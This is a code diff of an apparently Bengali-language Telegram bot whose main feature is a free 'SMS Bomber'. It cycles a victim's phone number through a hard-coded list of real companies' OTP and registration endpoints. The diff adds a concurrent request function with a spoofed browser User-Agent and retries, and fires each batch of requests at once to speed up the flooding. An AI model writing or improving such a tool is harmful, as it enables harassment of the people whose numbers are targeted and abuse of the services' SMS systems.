@@ -23,7 +23,6 @@ DB_PATH = os.path.join(os.path.dirname(__file__), "bot_database.db")
 CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
 LOG_FILE = "bot.log"
 
-# ===================== লগিং =====================
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -31,7 +30,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ===================== ডিফল্ট API লিস্ট =====================
 DEFAULT_APIS = [
     {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
     {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
@@ -57,7 +55,6 @@ DEFAULT_APIS = [
 WORKING_APIS = []
 API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
 
-# ===================== ডাটাবেস =====================
 async def init_db():
     try:
         async with aiosqlite.connect(DB_PATH) as db:
@@ -133,7 +130,6 @@ def load_api_list():
         with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
             json.dump(DEFAULT_APIS, f, indent=2, ensure_ascii=False)
 
-# ===================== হেল্পার =====================
 def replace_phone(data, phone):
     if isinstance(data, dict):
         return {k: replace_phone(v, phone) for k, v in data.items()}
@@ -206,7 +202,6 @@ async def admin_log(admin_id, action, target_id=None, details=""):
     except Exception as e:
         logger.error(f"অ্যাডমিন লগ error: {e}")
 
-# ===================== কীবোর্ড =====================
 def get_main_keyboard():
     keyboard = [
         ["📨 Send SMS", "💣 SMS Bomber"],
@@ -241,7 +236,6 @@ async def is_user_banned(user_id):
             row = await cur.fetchone()
             return row and row[0] == 'banned'
 
-# ===================== স্টার্ট =====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -271,7 +265,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=get_main_keyboard()
         )
 
-# ===================== ইউজার ফাংশনসমূহ =====================
 async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if await is_user_banned(user_id):
@@ -344,13 +337,46 @@ async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     context.user_data.clear()
 
-# ===================== SMS Bomber (ফ্রি) =====================
+# ===================== SMS BOMBER (ফ্রি + স্পিড বুস্ট + সঠিক কাউন্ট) =====================
+async def send_single_request(api, number, session):
+    """একটি API-তে একটি রিকোয়েস্ট পাঠায়"""
+    retries = API_LIMITS.get("max_retries", 3)
+    for attempt in range(retries):
+        try:
+            body = replace_phone(api['body'], number)
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive"
+            }
+            await asyncio.sleep(random.uniform(0.3, 0.7))
+            if api['method'] == 'POST':
+                async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
+                    text = await resp.text()
+                    if check_success(text, resp.status):
+                        return True
+                    else:
+                        return False
+            else:
+                async with session.get(api['url'], headers=headers, timeout=15) as resp:
+                    if resp.status in [200, 201, 202, 204]:
+                        return True
+                    else:
+                        return False
+        except Exception as e:
+            logger.error(f"Attempt {attempt+1} failed for {api['name']}: {e}")
+            if attempt == retries - 1:
+                return False
+            await asyncio.sleep(1)
+    return False
+
 async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if await is_user_banned(user_id):
         await update.message.reply_text("🚫 আপনি ব্যান্ড!")
         return
-    # ব্যালেন্স চেক করা হচ্ছে না – বোম্বিং ফ্রি
     await update.message.reply_text(
         "💣 **এসএমএস বোম্বার (ফ্রি)**\n\nটার্গেট নম্বর দিন (০১XXXXXXXXX):\n📡 এপিআই: {}\n⚠️ প্রতি এপিআই সর্বোচ্চ ২০ বার".format(len(WORKING_APIS)),
         parse_mode="Markdown",
@@ -388,7 +414,7 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     total_sms = len(WORKING_APIS) * amount
 
-    # ✅ বোম্বিং ফ্রি – শুধু বোম্বিং কাউন্ট বাড়ানো হবে
+    # বোম্বিং ফ্রি – শুধু কাউন্ট বাড়ে
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE users SET total_bombing = total_bombing + 1 WHERE user_id = ?", (user_id,))
         await db.commit()
@@ -397,83 +423,50 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏳ **বোম্বিং শুরু! (ফ্রি)**\n\n📱 টার্গেট: `{number}`\n📡 এপিআই: {len(WORKING_APIS)}\n💥 প্রতি এপিআই: {amount}\n📊 মোট: {total_sms}\n⏰ দয়া করে অপেক্ষা করুন...",
         parse_mode="Markdown"
     )
+
     success_count = 0
     failed_count = 0
-    api_results = []
+    total_done = 0
+
     async with aiohttp.ClientSession() as session:
         for api in WORKING_APIS:
             api_success = 0
             api_failed = 0
-            for j in range(amount):
-                retries = API_LIMITS.get("max_retries", 3)
-                for attempt in range(retries):
-                    try:
-                        body = replace_phone(api['body'], number)
-                        headers = {
-                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                            "Accept": "application/json",
-                            "Content-Type": "application/json",
-                            "Accept-Encoding": "gzip, deflate, br",
-                            "Connection": "keep-alive"
-                        }
-                        await asyncio.sleep(random.uniform(0.5, 1.0))
-                        if api['method'] == 'POST':
-                            async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
-                                text = await resp.text()
-                                if check_success(text, resp.status):
-                                    api_success += 1
-                                    success_count += 1
-                                    break
-                                else:
-                                    api_failed += 1
-                                    failed_count += 1
-                        else:
-                            async with session.get(api['url'], headers=headers, timeout=15) as resp:
-                                if resp.status in [200, 201, 202, 204]:
-                                    api_success += 1
-                                    success_count += 1
-                                    break
-                                else:
-                                    api_failed += 1
-                                    failed_count += 1
-                    except asyncio.TimeoutError:
-                        if attempt == retries - 1:
-                            api_failed += 1
-                            failed_count += 1
-                        else:
-                            await asyncio.sleep(1)
-                    except Exception as e:
-                        logger.error(f"API error {api['name']}: {e}")
-                        if attempt == retries - 1:
-                            api_failed += 1
-                            failed_count += 1
-                        else:
-                            await asyncio.sleep(1)
-                done = sum([r['success'] + r['failed'] for r in api_results]) + api_success + api_failed
-                if done % 10 == 0 or done == total_sms:
+
+            # একসাথে সব রিকোয়েস্ট জেনারেট করা
+            tasks = []
+            for _ in range(amount):
+                tasks.append(send_single_request(api, number, session))
+
+            # সব রিকোয়েস্ট একসাথে চালানো (স্পিড বুস্ট)
+            results = await asyncio.gather(*tasks)
+
+            # ফলাফল প্রক্রিয়া করা
+            for result in results:
+                if result:
+                    api_success += 1
+                    success_count += 1
+                else:
+                    api_failed += 1
+                    failed_count += 1
+                total_done += 1
+
+                # প্রতি ১০টি রিকোয়েস্টে বা শেষে আপডেট
+                if total_done % 10 == 0 or total_done == total_sms:
                     try:
                         await msg.edit_text(
-                            f"⏳ **বোম্বিং চলছে... (ফ্রি)**\n\n📱 টার্গেট: `{number}`\n✅ সফল: {success_count}\n❌ ব্যর্থ: {failed_count}\n📊 অগ্রগতি: {done}/{total_sms}",
+                            f"⏳ **বোম্বিং চলছে... (ফ্রি)**\n\n📱 টার্গেট: `{number}`\n✅ সফল: {success_count}\n❌ ব্যর্থ: {failed_count}\n📊 অগ্রগতি: {total_done}/{total_sms}",
                             parse_mode="Markdown"
                         )
                     except:
                         pass
+
+            # API-র সামগ্রিক সাফল্য ট্র্যাক
             overall_success = api_success > 0
             await track_api_usage(api['name'], user_id, overall_success)
-            api_results.append({
-                'name': api['name'],
-                'success': api_success,
-                'failed': api_failed,
-                'overall': overall_success
-            })
+
     success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
-    top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
-    top_apis_text = ""
-    for idx, api in enumerate(top_apis, 1):
-        if api['success'] > 0:
-            top_apis_text += f"{idx}. {api['name']}: ✅{api['success']}\n"
-    if not top_apis_text:
-        top_apis_text = "❌ কোনো সফল এপিআই নেই!"
+
     result_message = (
         f"✅ **বোম্বিং সম্পূর্ণ! (ফ্রি)**\n\n"
         f"📱 টার্গেট: `{number}`\n"
@@ -481,8 +474,7 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"💥 মোট: {total_sms}\n"
         f"✅ সফল: {success_count}\n"
         f"❌ ব্যর্থ: {failed_count}\n"
-        f"📊 সাফল্য হার: {success_rate}%\n\n"
-        f"🏆 **শীর্ষ ১০ এপিআই:**\n{top_apis_text}"
+        f"📊 সাফল্য হার: {success_rate}%"
     )
     await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
     context.user_data.clear()
@@ -574,7 +566,7 @@ async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-# ===================== অ্যাডমিন ফাংশনসমূহ =====================
+# ===================== অ্যাডমিন ফাংশন (সংক্ষেপে) =====================
 async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -872,7 +864,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message.text
     logger.info(f"📩 {user_id} থেকে মেসেজ: {message}")
 
-    # অ্যাডমিন চয়েস মেনু হ্যান্ডলিং
     if user_id == ADMIN_ID:
         if message == "👑 Admin Panel":
             await update.message.reply_text("👑 **অ্যাডমিন প্যানেল**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
@@ -926,18 +917,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await admin_state_handler(update, context)
             return
 
-    # ব্যান চেক
     if await is_user_banned(user_id):
         await update.message.reply_text("🚫 আপনার অ্যাকাউন্ট ব্যান করা হয়েছে!")
         return
 
-    # ইউজার ব্যাক
     if message == "🔙 Back":
         await update.message.reply_text("🏠 মেইন মেনু", reply_markup=get_main_keyboard())
         context.user_data.clear()
         return
 
-    # ইউজার মেনু
     if message == "📨 Send SMS":
         await cmd_sms(update, context)
     elif message == "💣 SMS Bomber":
